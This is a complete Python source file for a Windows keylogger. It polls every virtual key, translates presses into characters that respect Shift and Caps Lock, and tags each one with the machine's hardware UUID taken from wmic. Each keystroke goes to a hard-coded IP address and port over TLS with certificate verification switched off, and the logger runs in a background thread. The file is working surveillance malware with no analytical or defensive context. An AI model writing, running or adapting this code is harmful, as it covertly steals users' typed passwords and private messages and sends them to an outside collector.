
def main():
    import socket
    import ctypes
    import time
    import ssl
    import os

    HOST = '172.26.199.159'
    PORT = 4242

    # Windows constants for virtual key codes and key states
    VK_SHIFT = 0x10
    VK_CAPITAL = 0x14  # CAPS LOCK
    VK_CONTROL = 0x11
    VK_MENU = 0x12  # ALT key

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    # Function definitions for keyboard layout and key translation
    GetAsyncKeyState = user32.GetAsyncKeyState
    GetKeyboardLayout = user32.GetKeyboardLayout
    MapVirtualKeyW = user32.MapVirtualKeyW
    ToUnicode = user32.ToUnicode
    GetKeyState = user32.GetKeyState

    # Initialize key states
    prev_key_states = [0] * 256

    # Detect the current keyboard layout
    hWnd = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hWnd, None)
    layout_id = GetKeyboardLayout(thread_id)

    # Main keylogger loop
    while True:
        for vk_code in range(256):
            key_state = GetAsyncKeyState(vk_code)
            if key_state & 0x8000:
                if prev_key_states[vk_code] == 0:
                    # Create buffers for the translation functions
                    scan_code = MapVirtualKeyW(vk_code, 0)
                    buffer = ctypes.create_unicode_buffer(4)  # Create a buffer for the character

                    # Get the states of SHIFT and CAPS LOCK
                    shift_state = GetKeyState(VK_SHIFT) & 0x8000
                    caps_lock_state = GetKeyState(VK_CAPITAL) & 0x0001
                    
                    # Define the keyboard state array
                    keyboard_state = (ctypes.c_ubyte * 256)()
                    user32.GetKeyboardState(ctypes.byref(keyboard_state))

                    # Modify the keyboard state to include SHIFT and CAPS LOCK states
                    if shift_state:
                        keyboard_state[VK_SHIFT] = 0x80  # Set SHIFT key as pressed
                    if caps_lock_state:
                        keyboard_state[VK_CAPITAL] = 0x01  # Set CAPS LOCK as toggled

                    # Translate the virtual key code to a character using ToUnicode
                    result = ToUnicode(vk_code, scan_code, keyboard_state, buffer, len(buffer), 0)
                    if result > 0:
                        char = buffer.value
                        
                        # Send captured keystroke data to the server over SSL without certificate verification
                        try:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            with socket.create_connection((HOST, PORT)) as sock:
                                with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                                    uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
                                    ssock.sendall(b"keylogger|||" + uid.encode() + b"|||" + char.encode())
                        except ConnectionRefusedError:
                            pass
                        except ssl.SSLError:
                            pass

                prev_key_states[vk_code] = 1
            else:
                prev_key_states[vk_code] = 0

        time.sleep(0.01)

import threading
threading.Thread(target=main).start()
print("Keylogger started.")